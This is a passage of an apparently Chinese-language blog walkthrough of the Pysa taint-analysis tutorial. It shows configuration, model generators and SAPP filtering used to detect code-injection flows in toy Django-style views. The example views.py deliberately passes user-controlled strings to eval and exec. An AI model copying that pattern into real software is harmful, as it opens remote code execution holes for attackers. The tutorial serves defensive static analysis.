]</span><br><span class="line">&gt;&gt;&gt; issues <span class="comment"># è¿”å› 2 ä¸ªé—®é¢˜</span></span><br><span class="line">Issue 1</span><br><span class="line">            Code: 5001</span><br><span class="line">         Message: Data from [UserControlled] <span class="built_in">source</span>(s) may reach [RemoteCodeExecution] sink(s)</span><br><span class="line">        Callable: views.do_or</span><br><span class="line">         Sources: UserControlled</span><br><span class="line">           Sinks: RemoteCodeExecution</span><br><span class="line">        Features: first-index:right</span><br><span class="line">                  always-via:format-string</span><br><span class="line">                  has:first-index</span><br><span class="line">                  first-index:left</span><br><span class="line">        Location: views.py:33|18|38</span><br><span class="line">Min Trace Length: Source (0) | Sink (0)</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">Issue 2</span><br><span class="line">            Code: 5001</span><br><span class="line">         Message: Data from [UserControlled] <span class="built_in">source</span>(s) may reach [RemoteCodeExecution] sink(s)</span><br><span class="line">        Callable: views.do_and</span><br><span class="line">         Sources: UserControlled</span><br><span class="line">           Sinks: RemoteCodeExecution</span><br><span class="line">        Features: first-index:right</span><br><span class="line">                  always-type:bool</span><br><span class="line">                  always-type:scalar</span><br><span class="line">                  always-via:obscure</span><br><span class="line">                  always-via:format-string</span><br><span class="line">                  first-index:left</span><br><span class="line">                  has:first-index</span><br><span class="line">        Location: views.py:21|18|39</span><br><span class="line">Min Trace Length: Source (0) | Sink (0)</span><br><span class="line">Found 2 issues with run_id 1.</span><br><span class="line"></span><br><span class="line">[ run 1 ]</span><br><span class="line">&gt;&gt;&gt; issues(exclude_features=[<span class="string">&quot;always-type:bool&quot;</span>]) <span class="comment"># è¿‡æ»¤ do_and</span></span><br><span class="line">Issue 1</span><br><span class="line">            Code: 5001</span><br><span class="line">         Message: Data from [UserControlled] <span class="built_in">source</span>(s) may reach [RemoteCodeExecution] sink(s)</span><br><span class="line">        Callable: views.do_or</span><br><span class="line">         Sources: UserControlled</span><br><span class="line">           Sinks: RemoteCodeExecution</span><br><span class="line">        Features: first-index:right</span><br><span class="line">                  always-via:format-string</span><br><span class="line">                  has:first-index</span><br><span class="line">                  first-index:left</span><br><span class="line">        Location: views.py:33|18|38</span><br><span class="line">Min Trace Length: Source (0) | Sink (0)</span><br><span class="line">Found 1 issues with run_id 1.</span><br><span class="line"></span><br><span class="line">[ run 1 ]</span><br><span class="line">&gt;&gt;&gt; <span class="built_in">exit</span> <span class="comment"># é€€å‡º</span></span><br><span class="line">(tutorial) jck@analysis:~/pyre-check/documentation/pysa_tutorial/exercise4$</span><br></pre></td></tr></table></figure><p>åœ¨ taint.config ä¸­æ·»åŠ åç§°ä¸º assert_numeric çš„ç‰¹å¾ã€‚</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">&quot;sources&quot;</span>: [],</span><br><span class="line">  <span class="attr">&quot;sinks&quot;</span>: [],</span><br><span class="line">  <span class="attr">&quot;features&quot;</span>: [</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;example&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;comment&quot;</span>: <span class="string">&quot;Copy this feature and write your own. Don&#x27;t forget that JSON lists are comma seperated!&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;assert_numeric&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;comment&quot;</span>: <span class="string">&quot;via assert_numeric&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">  ],</span><br><span class="line">  <span class="attr">&quot;rules&quot;</span>: []</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨ features.pysa ä¸­ä½¿ç”¨è¯¥ç‰¹å¾ï¼ŒæŒ‡æ˜ views.assert_numeric å‡½æ•°çš„ operand å‚æ•°å¸¦æœ‰è¯¥ç‰¹å¾ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">def views.assert_numeric(operand: AddFeatureToArgument[Via[assert_numeric]]): ...</span><br></pre></td></tr></table></figure><p>é‡æ–°è¿è¡Œ Pysa å¹¶åœ¨ SAPP ä¸­æ‰“å¼€ç»“æœï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pyre analyze --no-verify --save-results-to .</span><br><span class="line">sapp analyze taint-output.json</span><br><span class="line">sapp explore</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°æ–°çš„ç‰¹å¾ï¼Œä½¿ç”¨ä¸¤ä¸ªç‰¹å¾è¿‡æ»¤ï¼Œè¿”å› 0 ä¸ªå®‰å…¨é—®é¢˜ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">[ run 2 ]</span><br><span class="line">&gt;&gt;&gt; issues</span><br><span class="line">Issue 3</span><br><span class="line">            Code: 5001</span><br><span class="line">         Message: Data from [UserControlled] <span class="built_in">source</span>(s) may reach [RemoteCodeExecution] sink(s)</span><br><span class="line">        Callable: views.do_or</span><br><span class="line">         Sources: UserControlled</span><br><span class="line">           Sinks: RemoteCodeExecution</span><br><span class="line">        Features: always-via:format-string</span><br><span class="line">                  first-index:left</span><br><span class="line">                  always-via:assert_numeric  <span class="comment"># æ–°ç‰¹å¾</span></span><br><span class="line">                  first-index:right</span><br><span class="line">                  has:first-index</span><br><span class="line">        Location: views.py:33|18|38</span><br><span class="line">Min Trace Length: Source (0) | Sink (0)</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">Issue 4</span><br><span class="line">            Code: 5001</span><br><span class="line">         Message: Data from [UserControlled] <span class="built_in">source</span>(s) may reach [RemoteCodeExecution] sink(s)</span><br><span class="line">        Callable: views.do_and</span><br><span class="line">         Sources: UserControlled</span><br><span class="line">           Sinks: RemoteCodeExecution</span><br><span class="line">        Features: always-via:format-string</span><br><span class="line">                  always-via:obscure</span><br><span class="line">                  first-index:left</span><br><span class="line">                  always-type:scalar</span><br><span class="line">                  first-index:right</span><br><span class="line">                  has:first-index</span><br><span class="line">                  always-type:bool</span><br><span class="line">        Location: views.py:21|18|39</span><br><span class="line">Min Trace Length: Source (0) | Sink (0)</span><br><span class="line">Found 2 issues with run_id 2.</span><br><span class="line"></span><br><span class="line">[ run 2 ]</span><br><span class="line">&gt;&gt;&gt; issues(exclude_features=[<span class="string">&quot;always-type:bool&quot;</span>]) <span class="comment"># è¿‡æ»¤ do_and</span></span><br><span class="line">Issue 3</span><br><span class="line">            Code: 5001</span><br><span class="line">         Message: Data from [UserControlled] <span class="built_in">source</span>(s) may reach [RemoteCodeExecution] sink(s)</span><br><span class="line">        Callable: views.do_or</span><br><span class="line">         Sources: UserControlled</span><br><span class="line">           Sinks: RemoteCodeExecution</span><br><span class="line">        Features: always-via:format-string</span><br><span class="line">                  first-index:left</span><br><span class="line">                  always-via:assert_numeric</span><br><span class="line">                  first-index:right</span><br><span class="line">                  has:first-index</span><br><span class="line">        Location: views.py:33|18|38</span><br><span class="line">Min Trace Length: Source (0) | Sink (0)</span><br><span class="line">Found 1 issues with run_id 2.</span><br><span class="line"></span><br><span class="line">[ run 2 ]</span><br><span class="line">&gt;&gt;&gt; issues(exclude_features=[<span class="string">&quot;always-type:bool&quot;</span>, <span class="string">&quot;always-via:assert_numeric&quot;</span>]) <span class="comment"># è¿‡æ»¤ do_andã€do_or</span></span><br><span class="line"></span><br><span class="line">Found 0 issues with run_id 2.</span><br><span class="line"></span><br><span class="line">[ run 2 ]</span><br><span class="line">&gt;&gt;&gt; <span class="built_in">exit</span></span><br><span class="line">(tutorial) jck@analysis:~/pyre-check/documentation/pysa_tutorial/exercise4$</span><br></pre></td></tr></table></figure><h2 id="exercise5"><a href="#exercise5" class="headerlink" title="exercise5"></a>exercise5</h2><p>åŠ¨æ€æ¨¡å‹ç”Ÿæˆå™¨åœ¨ Pysa ä¹‹å‰è¿è¡Œï¼Œèƒ½å¤Ÿç”Ÿæˆ <code>.pysa</code> æ–‡ä»¶ã€‚å®˜æ–¹ä»“åº“ <a href="https://github.com/facebook/pyre-check/tree/master/tools/generate_taint_models">pyre-check/tools/generate_taint_models/get_*.py</a> ä¸­åŒ…å«äº†ç”Ÿæˆå™¨ï¼Œè¯´æ˜æ–‡æ¡£è§ <a href="https://pyre-check.org/docs/pysa-model-generators/">Dynamically Generating Models</a>ã€‚</p><p>ç›´æ¥è¿è¡Œ <code>pyre analyze --no-verify</code> æ²¡æœ‰æ£€æµ‹å‡ºå®‰å…¨é—®é¢˜ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">Æ› No cached overrides loaded, computing overrides...</span><br><span class="line">Æ› `google.protobuf.message.Message.ClearField` has 57 overrides, this might slow down the analysis considerably.</span><br><span class="line">Æ› `google.protobuf.message.Message.__init__` has 58 overrides, this might slow down the analysis considerably.</span><br><span class="line">Æ› Iteration <span class="comment">#2. 4 Callables [zipfile.ZipFile::__init__ (override), str::format (override), shelve.Shelf::__init__ (overri[]</span></span><br></pre></td></tr></table></figure><p>views.py å’Œ urls.py æ¨¡ä»¿ Django å¤„ç†è¯·æ±‚çš„é€»è¾‘ã€‚views.py ä¸¤ä¸ªå‡½æ•°éƒ½å­˜åœ¨ RCE æ¼æ´ï¼Œä½† Pysa äº§ç”Ÿäº†æ¼æŠ¥ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> Callable</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">api_wrapper</span>(<span class="params">func: Callable</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">inner</span>(<span class="params">request</span>):</span></span><br><span class="line">        func(request, **request.GET)</span><br><span class="line">    <span class="keyword">return</span> inner</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">operate_on_twos</span>(<span class="params">request, operator: <span class="built_in">str</span></span>):</span></span><br><span class="line">    result = <span class="built_in">eval</span>(<span class="string">f&quot;2 <span class="subst">&#123;operator&#125;</span> 2&quot;</span>)  <span class="comment"># noqa: P204</span></span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="meta">@api_wrapper</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">operate_on_threes</span>(<span class="params">request, operator: <span class="built_in">str</span></span>):</span></span><br><span class="line">    exec(<span class="string">f&quot;result = 3 <span class="subst">&#123;operator&#125;</span> 3&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> result  <span class="comment"># noqa: F821</span></span><br></pre></td></tr></table></figure><p>urls.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> dataclasses <span class="keyword">import</span> dataclass</span><br><span class="line"><span class="keyword">from</span> views <span class="keyword">import</span> operate_on_twos</span><br><span class="line"></span><br><span class="line"><span class="meta">@dataclass</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UrlPattern</span>:</span></span><br><span class="line">    path: <span class="built_in">str</span></span><br><span class="line">    callback: <span class="built_in">str</span></span><br><span class="line"></span><br><span class="line">urlpatterns = [UrlPattern(<span class="string">r&quot;^operate_on_twos/(.*)&quot;</span>, operate_on_twos)]</span><br></pre></td></tr></table></figure><p>generate_models.py èƒ½å¤Ÿä¸º views.py åŠ¨æ€ç”Ÿæˆæ±¡ç‚¹æ³¨é‡Šã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> importlib</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> pathlib <span class="keyword">import</span> Path</span><br><span class="line"><span class="keyword">from</span> urls <span class="keyword">import</span> UrlPattern</span><br><span class="line"></span><br><span class="line"><span class="comment"># Make sure we&#x27;re able to import dependencies in &#x27;pyre-check&#x27; repo, since they</span></span><br><span class="line"><span class="comment"># are not currently in the PyPI package for pyre-check</span></span><br><span class="line">current_file = Path(__file__).absolute()</span><br><span class="line">sys.path.append(<span class="built_in">str</span>(current_file.parents[<span class="number">4</span>]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># Work around &#x27;-&#x27; in the name of &#x27;pyre-check&#x27;</span></span><br><span class="line">generate_taint_models = importlib.import_module(</span><br><span class="line">    <span class="string">&quot;pyre-check.tools.generate_taint_models&quot;</span></span><br><span class="line">)</span><br><span class="line">view_generator = importlib.import_module(</span><br><span class="line">    <span class="string">&quot;pyre-check.tools.generate_taint_models.view_generator&quot;</span></span><br><span class="line">)</span><br><span class="line">generator_specifications = importlib.import_module(</span><br><span class="line">    <span class="string">&quot;pyre-check.tools.generate_taint_models.generator_specifications&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Ignore</span>:</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>() -&gt; <span class="keyword">None</span>:</span></span><br><span class="line">    <span class="comment"># Here, specify all the generators that you might want to call.</span></span><br><span class="line">    generators = &#123;</span><br><span class="line">        <span class="string">&quot;django_path_params&quot;</span>: generate_taint_models.RESTApiSourceGenerator(</span><br><span class="line">            django_urls=view_generator.DjangoUrls(</span><br><span class="line">                urls_module=<span class="string">&quot;urls&quot;</span>,</span><br><span class="line">                url_pattern_type=UrlPattern,</span><br><span class="line">                url_resolver_type=Ignore,</span><br><span class="line">            )</span><br><span class="line">        ),</span><br><span class="line">        <span class="comment"># &quot;decorator_extracted_params&quot;: generate_taint_models.&lt;GENERATOR_NAME&gt;(</span></span><br><span class="line">        <span class="comment">#     root=&quot;.&quot;,</span></span><br><span class="line">        <span class="comment">#     annotation_specifications=[</span></span><br><span class="line">        <span class="comment">#         generate_taint_models.DecoratorAnnotationSpecification(</span></span><br><span class="line">        <span class="comment">#             decorator=&lt;DECORATOR_NAME_INCLUDING_PRECEEDING_@&gt;,</span></span><br><span class="line">        <span class="comment">#             annotations=generator_specifications.default_entrypoint_taint,</span></span><br><span class="line">        <span class="comment">#         )</span></span><br><span class="line">        <span class="comment">#     ],</span></span><br><span class="line">        <span class="comment"># ),</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment"># The `run_generators` function will take care of parsing command-line arguments, as</span></span><br><span class="line">    <span class="comment"># well as executing the generators specified in `default_modes` unless you pass in a</span></span><br><span class="line">    <span class="comment"># specific set from the command line.</span></span><br><span class="line">    generate_taint_models.run_generators(</span><br><span class="line">        generators,</span><br><span class="line">        default_modes=[</span><br><span class="line">            <span class="string">&quot;django_path_params&quot;</span>,</span><br><span class="line">            <span class="comment"># &quot;decorator_extracted_params&quot;</span></span><br><span class="line">        ],</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>åˆ©ç”¨ generate_models.py åŠ¨æ€ç”Ÿæˆ <code>.pysa</code> æ–‡ä»¶ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python generate_models.py --output-directory .</span><br></pre></td></tr></table></figure><div class="note danger flat"><p>æŠ¥é”™ graphql3 æ¨¡å—æ²¡æœ‰æ‰¾åˆ°ï¼Œå°†æ–‡ä»¶ä¸­çš„ <code>graphql3</code> æ”¹ä¸º <code>graphql</code>ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vim /home/jck/pyre-check/tools/generate_taint_models/get_dynamic_graphql_sources.py</span><br><span class="line"><span class="comment"># from graphql import GraphQLSchema</span></span><br></pre></td></tr></table></figure></div><p>é‡æ–°æ‰§è¡ŒæˆåŠŸï¼Œè¾“å‡ºå¦‚ä¸‹ï¼Œç”Ÿæˆ generated_django_path_params.pysa é…ç½®æ–‡ä»¶ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">(tutorial) jck@analysis:~/pyre-check/documentation/pysa_tutorial/exercise5$ python generate_models.py --output-directory .</span><br><span class="line">2021-07-07 03:24:56 INFO Computing models <span class="keyword">for</span> `django_path_params`</span><br><span class="line">2021-07-07 03:24:56 INFO Getting all URLs from `urls`</span><br><span class="line">2021-07-07 03:24:56 INFO Computed models <span class="keyword">for</span> `django_path_params` <span class="keyword">in</span> 0.000 seconds.</span><br><span class="line">&#123;<span class="string">&quot;number of generated models&quot;</span>: 1&#125;</span><br></pre></td></tr></table></figure><p>generated_django_path_params.pysa ä¸­æŒ‡æ˜äº†ä½¿ç”¨æ±¡ç‚¹æºç‚¹å’Œæ±‡ç‚¹çš„å‡½æ•°ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">def views.operate_on_twos(request: TaintSource[UserControlled], operator: TaintSource[UserControlled]) -&gt; TaintSink[ReturnedToUser]: ...</span><br></pre></td></tr></table></figure><p>å†æ¬¡æ‰§è¡Œ <code>pyre analyze --no-verify</code>ï¼Œå¾—åˆ° 1 ä¸ªå®‰å…¨é—®é¢˜ï¼Œè¿˜æœ‰ä¸€ä¸ªé—®é¢˜ä»ç„¶æ¼æŠ¥ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">Æ› No cached overrides loaded, computing overrides...</span><br><span class="line">Æ› `google.protobuf.message.Message.ClearField` has 57 overrides, this might slow down the analysis considerably.</span><br><span class="line">Æ› `google.protobuf.message.Message.__init__` has 58 overrides, this might slow down the analysis considerably.</span><br><span class="line">Æ› Iteration <span class="comment">#2. 4 Callables [zipfile.ZipFile::__init__ (override), str::format (override), shelve.Shelf::__init__ (overri[</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="string">&quot;line&quot;</span>: 17,</span><br><span class="line">    <span class="string">&quot;column&quot;</span>: 18,</span><br><span class="line">    <span class="string">&quot;stop_line&quot;</span>: 17,</span><br><span class="line">    <span class="string">&quot;stop_column&quot;</span>: 35,</span><br><span class="line">    <span class="string">&quot;path&quot;</span>: <span class="string">&quot;views.py&quot;</span>,</span><br><span class="line">    <span class="string">&quot;code&quot;</span>: 5001,</span><br><span class="line">    <span class="string">&quot;name&quot;</span>: <span class="string">&quot;Possible shell injection&quot;</span>,</span><br><span class="line">    <span class="string">&quot;description&quot;</span>:</span><br><span class="line">      <span class="string">&quot;Possible shell injection [5001]: Data from [UserControlled] source(s) may reach [RemoteCodeExecution] sink(s)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;long_description&quot;</span>:</span><br><span class="line">      <span class="string">&quot;Possible shell injection [5001]: Data from [UserControlled] source(s) may reach [RemoteCodeExecution] sink(s)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;concise_description&quot;</span>:</span><br><span class="line">      <span class="string">&quot;Possible shell injection [5001]: Data from [UserControlled] source(s) may reach [RemoteCodeExecution] sink(s)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;inference&quot;</span>: null,</span><br><span class="line">    <span class="string">&quot;define&quot;</span>: <span class="string">&quot;views.operate_on_twos&quot;</span></span><br><span class="line">  &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure><p>æ‰©å±• generate_models.py è¯†åˆ«è£…é¥°å™¨ï¼Œä½¿ç”¨æ³¨é‡Šçš„å†…å®¹ï¼Œåªéœ€è¦å¡«å…¥ä¸¤é¡¹ï¼ˆç”Ÿæˆå™¨å¯ä»¥åœ¨ <a href="https://pyre-check.org/docs/pysa-model-generators/#example-model-generators">Example Model Generators</a> é‡Œæ‰¾ï¼‰ï¼š</p><ul><li><code>&lt;GENERATOR_NAME&gt;</code>ï¼š<code>AnnotatedFreeFunctionWithDecoratorGenerator</code></li><li><code>&lt;DECORATOR_NAME_INCLUDING_PRECEEDING_@&gt;</code>ï¼š<code>&quot;@api_wrapper&quot;</code></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>() -&gt; <span class="keyword">None</span>:</span></span><br><span class="line">    <span class="comment"># Here, specify all the generators that you might want to call.</span></span><br><span class="line">    generators = &#123;</span><br><span class="line">        <span class="string">&quot;django_path_params&quot;</span>: generate_taint_models.RESTApiSourceGenerator(</span><br><span class="line">            django_urls=view_generator.DjangoUrls(</span><br><span class="line">                urls_module=<span class="string">&quot;urls&quot;</span>,</span><br><span class="line">                url_pattern_type=UrlPattern,</span><br><span class="line">                url_resolver_type=Ignore,</span><br><span class="line">            )</span><br><span class="line">        ),</span><br><span class="line">        <span class="string">&quot;decorator_extracted_params&quot;</span>: generate_taint_models.AnnotatedFreeFunctionWithDecoratorGenerator(</span><br><span class="line">            root=<span class="string">&quot;.&quot;</span>,</span><br><span class="line">            annotation_specifications=[</span><br><span class="line">                generate_taint_models.DecoratorAnnotationSpecification(</span><br><span class="line">                    decorator=<span class="string">&quot;@api_wrapper&quot;</span>,</span><br><span class="line">                    annotations=generator_specifications.default_entrypoint_taint,</span><br><span class="line">                )</span><br><span class="line">            ],</span><br><span class="line">        ),</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment"># The `run_generators` function will take care of parsing command-line arguments, as</span></span><br><span class="line">    <span class="comment"># well as executing the generators specified in `default_modes` unless you pass in a</span></span><br><span class="line">    <span class="comment"># specific set from the command line.</span></span><br><span class="line">    generate_taint_models.run_generators(</span><br><span class="line">        generators,</span><br><span class="line">        default_modes=[</span><br><span class="line">            <span class="string">&quot;django_path_params&quot;</span>,</span><br><span class="line">            <span class="string">&quot;decorator_extracted_params&quot;</span></span><br><span class="line">        ],</span><br><span class="line">    )</span><br></pre></td></tr></table></figure><p>é‡æ–°ç”Ÿæˆ <code>.pysa</code> æ–‡ä»¶å¹¶æ‰§è¡Œåˆ†æï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python generate_models.py --output-directory .</span><br><span class="line">pyre analyze --no-verify</span><br></pre></td></tr></table></figure><p>æ£€æµ‹å‡º 2 ä¸ªå®‰å…¨é—®é¢˜ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">Æ› No cached overrides loaded, computing overrides...</span><br><span class="line">Æ› `google.protobuf.message.Message.ClearField` has 57 overrides, this might slow down the analysis considerably.</span><br><span class="line">Æ› `google.protobuf.message.Message.__init__` has 58 overrides, this might slow down the analysis considerably.</span><br><span class="line">Æ› Iteration <span class="comment">#2. 4 Callables [zipfile.ZipFile::__init__ (override), str::format (override), shelve.Shelf::__init__ (overri[</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="string">&quot;line&quot;</span>: 25,</span><br><span class="line">    <span class="string">&quot;column&quot;</span>: 9,</span><br><span class="line">    <span class="string">&quot;stop_line&quot;</span>: 25,</span><br><span class="line">    <span class="string">&quot;stop_column&quot;</span>: 35,</span><br><span class="line">    <span class="string">&quot;path&quot;</span>: <span class="string">&quot;views.py&quot;</span>,</span><br><span class="line">    <span class="string">&quot;code&quot;</span>: 5001,</span><br><span class="line">    <span class="string">&quot;name&quot;</span>: <span class="string">&quot;Possible shell injection&quot;</span>,</span><br><span class="line">    <span class="string">&quot;description&quot;</span>:</span><br><span class="line">      <span class="string">&quot;Possible shell injection [5001]: Data from [UserControlled] source(s) may reach [RemoteCodeExecution] sink(s)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;long_description&quot;</span>:</span><br><span class="line">      <span class="string">&quot;Possible shell injection [5001]: Data 